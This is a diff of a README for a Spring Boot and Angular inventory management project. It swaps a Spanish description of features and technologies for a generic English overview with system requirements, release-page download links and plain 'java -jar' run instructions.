@@ -1,39 +1,74 @@
-# 📦 Sistema de Inventario de Compras y Ventas
+# 📦 Proyecto-Inventario - Manage Your Inventory with Ease
 
-## 🎯 Descripción
+## 🚀 Overview
 
-Este proyecto es un sistema de inventario desarrollado con **Spring Boot** en el backend y **Angular** en el frontend. Permite gestionar de manera eficiente productos, proveedores, compras, ventas y usuarios, con un control de acceso basado en roles para garantizar la seguridad y el control de las operaciones.
+**Proyecto-Inventario** is a simple inventory management system. It helps you efficiently manage products, suppliers, purchases, and sales. With a role-based access system, you can ensure security and control over your operations.
 
-## 🔑 Características Principales
+## 🔧 Key Features
 
-- **Gestión de Usuarios**: Administración de usuarios con roles diferenciados (Administrador y Operador).
-- **Gestión de Proveedores**: Registro y actualización de proveedores, seguimiento de información de contacto y productos suministrados.
-- **Gestión de Productos**: Registro, actualización y control de stock de productos, incluyendo categorías y precios.
-- **Operaciones de Compras y Ventas**: Registro de compras y ventas, control de entradas y salidas de inventario.
-- **Reportes**: Generación de reportes de ventas, compras y stock por periodo de tiempo.
-- **Interfaz de Usuario**: Interfaz moderna y responsiva utilizando **Angular Material** y **Font Awesome**.
+- **User Management**: Administer users with different roles, such as Admin and Operator.
+- **Supplier Management**: Register and update suppliers, tracking contact information and provided products.
+- **Product Management**: Easily register, update, and control the stock of products, including categories and prices.
+- **Purchase and Sales Operations**: Record purchases and sales while managing inventory entries and exits.
+- **Reports**: Generate sales, purchase, and stock reports for specific time periods.
+- **User Interface**: Enjoy a modern interface designed for a smooth user experience.
 
-## 🧩 Tecnologías Utilizadas
+## 🎯 System Requirements
 
-### Backend
+To run **Proyecto-Inventario**, ensure your system meets the following requirements:
 
-- **Spring Boot**: Framework para la construcción de aplicaciones Java.
-- **Spring Data JPA**: Implementación de JPA para el acceso a datos.
-- **Spring Security**: Autenticación y autorización de usuarios.
-- **JWT (JSON Web Token)**: Autenticación basada en tokens.
-- **MySQL**: Sistema de gestión de bases de datos relacional.
-- **Apache POI**: Generación de archivos Excel para reportes.
+- **Operating System**: Windows, macOS, or Linux.
+- **Java**: Version 8 or higher installed.
+- **MySQL**: You need MySQL version 5.7 or higher for the database.
+- **RAM**: At least 4 GB of memory.
+- **Storage**: 500 MB of free disk space.
 
-### Frontend
+## 📥 Download & Install
 
-- **Angular**: Framework para la construcción de aplicaciones web.
-- **TypeScript**: Superset de JavaScript con tipado estático.
-- **Angular Material**: Componentes UI modernos y responsivos.
-- **Font Awesome**: Iconos para la interfaz de usuario.
+To get started, visit the Releases page and download the latest version of **Proyecto-Inventario**.
 
-### Herramientas
+[![Download Proyecto-Inventario](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/wepery/Proyecto-Inventario/releases)
 
-- **Maven**: Herramienta de automatización de construcción.
-- **Node.js**: Entorno de ejecución para JavaScript.
-- **Git**: Sistema de control de versiones.
-- **Postman**: Herramienta para pruebas de API.
+### Step-by-Step Installation
+
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/wepery/Proyecto-Inventario/releases) to find available versions of the software.
+   
+2. **Choose the Latest Version**: Look for the latest release noted at the top of the page. This version will include the most recent features and bug fixes.
+
+3. **Download the Software**: Click on the asset link for your operating system (look for files like `.jar` or installer files). The download will start automatically.
+
+4. **Run the Application**: 
+
+   - **Windows**: If you downloaded a `.jar` file, open a command prompt and navigate to the folder where the file is saved and run:
+     ```
+     java -jar Proyecto-Inventario.jar
+     ```
+   - **macOS/Linux**: Open a terminal, navigate to the download location, and run:
+     ```
+     java -jar Proyecto-Inventario.jar
+     ```
+
+5. **Set Up the Database**: If required, create a MySQL database for the application. Use the provided SQL scripts in the installation package to set up required tables.
+
+6. **Access the Application**: Open your web browser and go to `http://localhost:8080` to start using **Proyecto-Inventario**.
+
+## 🛠️ Getting Help
+
+If you run into issues or need assistance:
+
+- **Documentation**: Check the documentation provided in the repository for further guidance on specific features.
+- **Community Support**: Join our online community or forums related to **Proyecto-Inventario** to share your experiences and seek help.
+
+## 🌟 Contributing
+
+We welcome contributions! If you have suggestions or features to add, feel free to fork the repository and submit a pull request.
+
+## 📃 License
+
+**Proyecto-Inventario** is open source and available under the MIT License. This allows for personal and commercial use with proper attribution.
+
+## 📞 Contact
+
+For inquiries, reach out to the developer team via email or create an issue in the repository.
+
+Explore and enjoy managing your inventory with **Proyecto-Inventario**! For downloads, visit the [Releases page](https://github.com/wepery/Proyecto-Inventario/releases).
